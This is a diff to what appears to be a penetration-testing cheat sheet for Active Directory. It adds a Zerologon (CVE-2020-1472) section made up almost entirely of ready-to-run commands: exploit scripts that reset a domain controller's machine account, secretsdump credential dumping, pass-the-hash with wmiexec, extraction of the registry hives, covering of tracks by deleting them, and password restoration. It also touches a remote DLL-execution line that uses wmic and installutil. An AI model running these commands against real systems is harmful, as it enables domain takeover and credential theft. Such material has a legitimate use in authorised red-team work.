@@ -202,6 +202,50 @@ Invoke-DomainPasswordSpray -Password Spring2017
 Find-InterestingDomainShareFile
 ```
 
+
+---
+## Direct Attacks to the Domain Controller
+### Zerologon [^16][^17]
+* Resets machine account of vulnerable domain controller
+    * Remember to restore the password after
+
+```bash
+python3 zerologon_tester.py dc02 10.10.10.20 # From securaBV
+ 
+python3 cve-2020-1472-exploit.py dc02 10.10.10.20 # From dirkjanm
+ 
+secretsdump.py -no-pass -just-dc acme.local/dc02\$@10.10.10.20 # From impacket
+```
+
+* Password restoration process
+```bash
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe acme.local/administrator@10.10.10.20
+cd Windows/temp
+reg save HKLM\SYSTEM system.save
+reg save HKLM\SAM sam.save
+reg save HKLM\SECURITY security.save
+ 
+smbclient \\\\10.10.10.20\\c$ -U 'acme.local\\administrator%2b576acbe6bcfda7294d6bd18041b8fe' --pw-nt-hash
+cd Windows/temp
+get system.save
+get security.save
+get sam.save
+ 
+ 
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe acme.local/administrator@10.10.10.20
+cd Windows/temp
+del system.save
+del security.save
+del sam.save
+ 
+ 
+secretsdump.py -sam sam.save -system system.save -security security.save local
+ 
+python3 restorepassword.py acme.local/dc02@dc02 -target-ip 10.10.10.20  -hexpass ef464f4194d9f401af41c9982dc7c85524cc9ed8adef4fe24c8044d13f1ae41c594131d2d46cab3a0d3384cda94baae65d5a87d26df1201ff6ff1697672ac4e16c16f0e514f6e54d84342c5af4193fe96329e3a30fb84c08845e7a289749225276c7c2e3181555fa5eef21d4d1ba23aba0f4706383327b299283f72b7df6b661cfb11189bd8b3ab552ffb99aa12ffe19b760e00e143ef3e776d8377da57925c5ed71aa9f0991acff7fc9c963addb8496fdd273f231e15a51d99f41a770de714573b26795c45a03eac80e3bb45ac5c100740da5814c3979e5349e8471623086c80f6160163f4bd56da3b75a6deb17b1020 # From dirkjanm
+ 
+secretsdump.py -no-pass -just-dc acme.local/dc02\$@10.10.10.20
+```
+
 ---
 ## Pivoting
 ### Executing Commands Remotely
@@ -241,7 +285,7 @@ winrs -r:DC01.domain.com cmd
 ```
 
 #### WMIC
-* Run a DLL file remotely using `wmic` via `installutil`[^13]
+* Run a DLL file remotely using `wmic` via `installutil`[^15]
     ```powershell
     wmic /node:dc01.domain.com process call create "cmd.exe /c \windows\microsoft.net\framework64\v4.0.30319\installutil.exe /logfile= /u \temp\file.dll"
     ```
@@ -262,3 +306,5 @@ winrs -r:DC01.domain.com cmd
 [^13]: [Move Aside Script Kiddies–Malware Execution in the Age of Advanced Defenses | Joff Thyer](https://www.youtube.com/watch?v=wTmQ5FaRmf4)
 [^14]: [Github - Knavesec - Max](https://github.com/knavesec/Max)
 [^15]: [Bloodhound - GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall)
+[^16]: [Github -  SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
+[^17]: [Github - dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
